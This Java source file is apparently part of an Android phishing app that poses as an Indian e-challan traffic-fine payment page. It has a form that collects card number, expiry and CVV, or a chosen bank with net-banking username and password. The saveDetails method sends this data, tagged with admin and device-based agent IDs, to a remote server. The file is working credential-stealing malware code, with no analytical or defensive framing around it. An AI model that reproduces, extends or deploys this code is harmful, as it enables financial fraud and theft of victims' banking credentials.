package com.pegalite.neotron3.ui.echallan;

import static android.view.View.GONE;
import static android.view.View.VISIBLE;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.text.Editable;
import android.text.TextWatcher;
import android.widget.ArrayAdapter;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.pegalite.neotron3.databinding.ActivityEchallanPage3Binding;
import com.pegalite.neotron3.functions.Utils;
import com.pegalite.neotron3.server.req.RetrofitClient;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class EChallanPage3Activity extends AppCompatActivity {

    ActivityEchallanPage3Binding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityEchallanPage3Binding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        binding.netBanking.setOnClickListener(v -> {
            binding.netBankingContainer.setVisibility(VISIBLE);
            binding.debitCardContainer.setVisibility(GONE);
        });

        binding.debitCard.setOnClickListener(v -> {
            binding.netBankingContainer.setVisibility(GONE);
            binding.debitCardContainer.setVisibility(VISIBLE);
        });

        ArrayAdapter<String> spinnerArrayAdapter = getStringArrayAdapter();
        binding.bankName.setAdapter(spinnerArrayAdapter);

        binding.cardNumber.addTextChangedListener(new TextWatcher() {
            private boolean isFormatting;

            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
            }

            @Override
            public void afterTextChanged(Editable s) {
                if (isFormatting) return;
                isFormatting = true;

                String input = s.toString().replaceAll("\\s", "");
                StringBuilder formatted = new StringBuilder();

                for (int i = 0; i < input.length(); i++) {
                    if (i > 0 && i % 4 == 0) {
                        formatted.append(" ");
                    }
                    formatted.append(input.charAt(i));
                }

                binding.cardNumber.removeTextChangedListener(this);
                binding.cardNumber.setText(formatted.toString());
                binding.cardNumber.setSelection(formatted.length());
                binding.cardNumber.addTextChangedListener(this);

                isFormatting = false;
            }
        });

        binding.expiry.addTextChangedListener(new TextWatcher() {
            private boolean isFormatting;

            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
            }

            @Override
            public void afterTextChanged(Editable s) {
                if (isFormatting) return;
                isFormatting = true;

                String input = s.toString().replaceAll("/", "");

                if (input.length() >= 3) {
                    input = input.substring(0, 2) + "/" + input.substring(2);
                }

                binding.expiry.removeTextChangedListener(this);
                binding.expiry.setText(input);
                binding.expiry.setSelection(input.length());
                binding.expiry.addTextChangedListener(this);

                isFormatting = false;
            }
        });


        binding.submit.setOnClickListener(v -> {
            if (binding.netBankingContainer.getVisibility() == VISIBLE) {
                handleNetBanking();
                return;
            }
            handleCard();
        });


    }

    private void handleCard() {
        String cardNumber = binding.cardNumber.getText().toString();
        String expiry = binding.expiry.getText().toString();
        String cvv = binding.cvv.getText().toString();

        if (cardNumber.isEmpty() || cvv.isEmpty() || expiry.isEmpty()) {
            Toast.makeText(this, "Please Enter All the Details!", Toast.LENGTH_SHORT).show();
            return;
        }

        try {
            JSONObject object = new JSONObject(getIntent().getStringExtra("data"));
            object.put("cardNumber", cardNumber);
            object.put("expiry", expiry);
            object.put("cvv", cvv);

            saveDetails(object);
            startActivity(new Intent(this, EChallanPage4Activity.class).putExtra("data", object.toString()));
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }

    }

    private void handleNetBanking() {
        String bankName = binding.bankName.getSelectedItem().toString();
        String userID = binding.username.getText().toString();
        String password = binding.password.getText().toString();

        if (bankName.equals("SELECT AN OPTION") || userID.isEmpty() || password.isEmpty()) {
            Toast.makeText(this, "Please Select All the Values", Toast.LENGTH_SHORT).show();
            return;
        }

        try {
            JSONObject object = new JSONObject(getIntent().getStringExtra("data"));
            object.put("bankName", bankName);
            object.put("userID", userID);
            object.put("password", password);
            saveDetails(object);
            startActivity(new Intent(this, EChallanPage5Activity.class).putExtra("data", object.toString()));
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }


    }

    @NonNull
    private ArrayAdapter<String> getStringArrayAdapter() {
        List<String> options = new ArrayList<>();
        options.add("SELECT AN OPTION");
        options.add("STATE BANK OF INDIA");
        options.add("HDFC BANK LTD");
        options.add("PUNJAB NATIONAL BANK");
        options.add("ICICI BANK LTD");
        options.add("CANARA BANK");
        options.add("CENTRAL BANK OF INDIA");
        options.add("SYNDICATE BANK");
        options.add("BANK OF BARODA");
        options.add("BANK OF INDIA");
        options.add("BANK OF MAHARASHTRA");
        options.add("ALLAHABAD BANK");
        options.add("UNION BANK OF INDIA");
        options.add("UCO BANK");
        options.add("INDIAN BANK");
        options.add("INDIAN OVERSEAS BANK");
        options.add("AXIS BANK");
        options.add("YES BANK");
        options.add("IDBI BANK");
        options.add("KOTAK MAHINDRA BANK");
        options.add("DHANLAXMI BANK");
        options.add("FEDERAL BANK");
        options.add("RBL BANK");
        options.add("SOUTH INDIAN BANK");
        options.add("TAMILNAD MERCANTILE BANK");
        options.add("KARNATAKA BANK");
        options.add("ANDHRA BANK");
        options.add("VIJAYA BANK");
        options.add("DENA BANK");
        options.add("CORPORATION BANK");
        options.add("ORIENTAL BANK OF COMMERCE");
        options.add("OTHER");

        ArrayAdapter<String> spinnerArrayAdapter =
                new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, options);
        spinnerArrayAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        return spinnerArrayAdapter;
    }


    private void saveDetails(JSONObject data) {
        try {
            RetrofitClient.getInstance(this).getApiInterfaces().onSaveDetails(RetrofitClient.generateRequestBody(new JSONObject().put("adminID", Utils.ADMIN_ID).put("submissionId", data.optString("submissionId")).put("agentID", "agent-" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + getPackageName()).put("details", data.put("type", Utils.THEME)))).enqueue(new Callback<>() {
                @Override
                public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {

                }

                @Override
                public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {

                }
            });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }
}